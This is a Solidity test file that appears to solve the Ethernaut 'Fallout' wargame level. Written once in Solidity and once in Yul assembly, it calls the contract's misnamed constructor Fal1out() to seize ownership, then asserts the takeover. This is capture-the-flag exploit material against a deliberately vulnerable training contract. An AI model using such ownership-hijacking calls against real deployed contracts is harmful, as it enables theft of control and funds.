// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {IFallout} from "ethernaut/2IFallout.sol";
import {BaseTest} from "../BaseTest.t.sol";

contract FalloutTest is BaseTest {
    IFallout public falloutInstance = IFallout(0x56c2AC5CAD2D1cEfF9B1634F0f4123d855D3d3CE);

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        falloutInstance.Fal1out();
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(falloutInstance.owner(), address(this));
    }

    function exploitYul() internal override {
        address _to = address(falloutInstance);
        assembly {
            mstore(0, 0x6fab5ddf) // Write function sig for Fal1out() to memory. It gets written in last 4 bytes of first 32 bytes i.e. 28-32
            pop(call(gas(), _to, 0, 28, 4, 0, 0)) // Make call
        }
    }

    function testExploitYul() public override {
        exploitYul();
        assertEq(falloutInstance.owner(), address(this));
    }

    receive() external payable {
        // To receive Eth
    }
}
